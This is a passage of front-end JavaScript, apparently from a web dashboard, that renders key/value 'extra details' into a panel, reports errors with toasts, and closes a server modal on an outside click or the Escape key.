                    <strong style="color:var(--emerald); font-size: 0.9rem; display:block; margin-bottom: 5px;">${page.toUpperCase()}</strong>`;
                for (const [k, v] of Object.entries(data)) {
                    html += `<div style="display:flex; justify-content:space-between; font-size:0.8rem; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.05);">
                        <span style="color:var(--sub);">${k}</span>
                        <span style="color:var(--text); font-family:monospace; font-weight:bold; word-break:break-all; max-width:60%; text-align:right;">${esc(String(v))}</span>
                    </div>`;
                }
                html += `</div>`;
            }
        }
        
        if (html === '') {
            html = '<div style="color:var(--sub); text-align:center;">No extra details found in pages.</div>';
        }
        
        moreDetailsEl.innerHTML = html;
        showToast('Extra details loaded', 'success');
    } catch(e) {
        moreDetailsEl.innerHTML = '<div style="color:var(--red); text-align:center;">Failed to fetch details</div>';
        showToast(e.message, 'error');
    }
}


// Win12 Global Event Listeners
if (!window._win12Initialized) {
    window._win12Initialized = true;
    document.addEventListener('click', (e) => {
        const modal = document.getElementById('serverModal');
        if (modal && !modal.classList.contains('hidden') && e.target === modal) {
            closeServerModal();
        }
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            closeServerModal();
            if (typeof closeSheet === 'function') closeSheet();
        }
    });
}
